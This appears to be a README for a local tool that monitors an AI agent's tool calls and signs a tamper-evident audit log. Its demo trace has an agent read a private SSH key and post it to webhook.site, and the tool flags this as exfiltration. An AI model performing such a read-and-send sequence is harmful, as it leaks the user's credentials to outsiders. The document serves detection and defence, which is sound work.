# PromptGuard demo: tamper-and-catch

A 60-second story showing the one thing a free, local, offline tool can do that a gated cloud product will not: catch an agent leaking data at runtime, then prove the audit log of it was not altered.

Run it yourself:

```bash
npm install && npm run build
bash scripts/demo.sh
```

The agent's OpenTelemetry tool-call trace (`examples/agent-trace.jsonl`):

1. `get_weather` (benign)
2. `read_file ~/.ssh/id_rsa` (reads a private key)
3. `http_post webhook.site` (sends it out)
4. `save_note` (benign)

## What you see

### 1. Record and scan, write a signed audit log

```
$ scan-mcp record examples/agent-trace.jsonl --log audit.jsonl --sign

4 tool call(s), 3 finding(s)

[CRITICAL] Secret in tool result: PEM-encoded Private Key
  at tool_call[1] read_file.result
  Appeared in a tool RESULT at runtime, which a pre-install static scan cannot see.

[CRITICAL] Toxic flow: sensitive read then external send
  at tool_call[1] read_file -> tool_call[2] http_post
  read_file (sensitive) then http_post to webhook.site (a known exfiltration sink)

[HIGH] Suspicious data sink: webhook.site

audit log written to audit.jsonl (signed, key a8a10977a5f5cc98)
anchor: pg-anchor:v1:6:a8a10977...:sha256:9dd00037...
```

The toxic flow is the key catch: it spans two calls (read, then send), which a per-server static scan structurally cannot see. The private key is caught in the tool RESULT, also invisible to a pre-install scan.

### 2. Verify the log: chain + signatures + anchor

```
$ scan-mcp verify audit.jsonl --anchor pg-anchor:v1:6:...
chain intact: every record links to the previous one; 6 signature(s) valid; head matches the recorded anchor. No tampering detected.
```

### 3. An attacker edits the log to hide the exfiltration, and is caught

```
$ scan-mcp verify audit.jsonl.tampered --anchor pg-anchor:v1:6:...
TAMPERING DETECTED at record 2: invalid signature on record 2 (forged or wrong key)
```

## Why this matters

- The detection (toxic flow, secret-in-result) runs on the agent's own telemetry, no proxy in the request path.
- The audit log is signed (Ed25519, local key) and anchorable (record the head in a git commit), so tampering is caught even by someone who controls the machine.
- Everything is local: no account, no network, no data leaving the box.

Nobody else combines local-first, security-framed, and offline-verifiable. That is the wedge.
